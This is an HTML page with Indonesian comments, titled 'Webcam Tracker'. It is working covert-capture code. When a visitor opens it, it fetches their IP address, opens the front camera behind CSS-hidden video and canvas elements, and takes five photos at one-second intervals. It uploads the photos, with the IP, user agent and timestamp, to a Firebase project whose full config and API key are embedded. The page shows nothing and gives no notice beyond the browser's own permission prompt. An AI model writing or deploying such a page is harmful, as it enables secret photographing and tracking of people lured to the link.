<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Webcam Tracker</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
  <style>
    video, canvas { display: none; }
    body { background: #fff; color: #000; }
  </style>
</head>
<body>
  <script>
    // ‚úÖ Konfigurasi Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const storage = firebase.storage();

    // Setup elemen
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    document.body.appendChild(video);
    document.body.appendChild(canvas);

    let photoCount = 0;
    const maxPhotos = 5;
    let visitorIP = "Unknown";
    let visitTime = "";

    // Ambil IP dan waktu kunjungan
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        visitorIP = data.ip;
        const now = new Date();
        visitTime = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
        console.log("‚úÖ IP Address:", visitorIP);
        startCamera();
      })
      .catch(err => {
        console.warn("‚ö†Ô∏è Gagal ambil IP:", err);
        startCamera();
      });

    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = () => {
            capturePhotos();
          };
        })
        .catch(err => {
          console.error("‚ùå Gagal akses kamera:", err);
        });
    }

    function capturePhotos() {
      const interval = setInterval(() => {
        if (photoCount >= maxPhotos) {
          clearInterval(interval);
          console.log("üì∏ Selesai ambil semua foto");
          return;
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);

        canvas.toBlob(blob => {
          const fileName = `webcam_${Date.now()}.jpg`;
          const storageRef = storage.ref('webcam/' + fileName);

          storageRef.put(blob)
            .then(snapshot => snapshot.ref.getDownloadURL())
            .then(downloadURL => {
              console.log(`‚úÖ Foto ${photoCount + 1} berhasil upload.`);
              return database.ref('webcam_snapshots').push({
                url: downloadURL,
                ip: visitorIP,
                userAgent: navigator.userAgent,
                time: visitTime,
                timestamp: Date.now()
              });
            })
            .then(() => {
              console.log(`üì§ Foto ${photoCount + 1} dan data terkirim ke Firebase`);
            })
            .catch(err => {
              console.error("‚ùå Gagal upload foto atau kirim data:", err);
            });
        }, 'image/jpeg');

        photoCount++;
      }, 1000); // ambil tiap 1 detik
    }
  </script>
</body>
</html>
